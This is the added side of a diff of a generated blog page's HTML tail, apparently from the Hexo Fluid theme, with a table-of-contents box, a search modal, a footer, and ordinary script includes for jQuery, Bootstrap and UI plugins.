+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
